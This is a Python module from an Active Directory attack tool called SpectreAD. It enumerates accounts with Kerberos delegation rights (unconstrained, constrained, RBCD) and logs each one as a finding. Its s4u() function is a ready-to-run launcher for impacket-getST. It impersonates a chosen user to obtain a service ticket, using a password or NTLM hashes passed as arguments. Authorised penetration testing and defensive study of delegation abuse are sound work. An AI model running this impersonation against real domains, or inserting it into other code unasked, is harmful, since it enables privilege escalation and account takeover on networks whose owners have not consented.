"""
SpectreAD :: core/delegation.py
Unconstrained / constrained / RBCD reporting and S4U.

Author : Inayat Hussain
"""

from __future__ import annotations

from core import ui
from core.store import open_store


def report(args) -> None:
    with open_store(args.store) as store:
        rows = []
        for u in store.users():
            if u["delegation"]:
                rows.append((u["sam"], "unconstrained", u["constrained"] or ""))
            elif u["constrained"]:
                rows.append((u["sam"], "constrained", u["constrained"]))
        for c in store.computers():
            if c["delegation"]:
                rows.append((c["sam"], "unconstrained", ""))
            if c["rbcd"]:
                rows.append((c["sam"], "RBCD set", ""))

        ui.table(["principal", "type", "allowed-to"], rows, "no delegation found")
        for principal, kind, target in rows:
            store.add_finding("critical" if kind == "unconstrained" else "high",
                              f"{kind} delegation: {principal}", target)
        store.log("delegation", "complete", args.domain, f"{len(rows)} found")


def s4u(args) -> None:
    import shutil
    import subprocess

    if not shutil.which("impacket-getST"):
        ui.warn("impacket-getST missing")
        return
    cmd = ["impacket-getST", "-spn", args.spn, "-impersonate", args.impersonate,
           f"{args.domain}/{args.username}", "-dc-ip", args.dc_ip]
    cmd += ["-hashes", args.hashes] if args.hashes else [f":{args.password or ''}"]
    ui.edge(" ".join(cmd))
    subprocess.run(cmd, check=False)
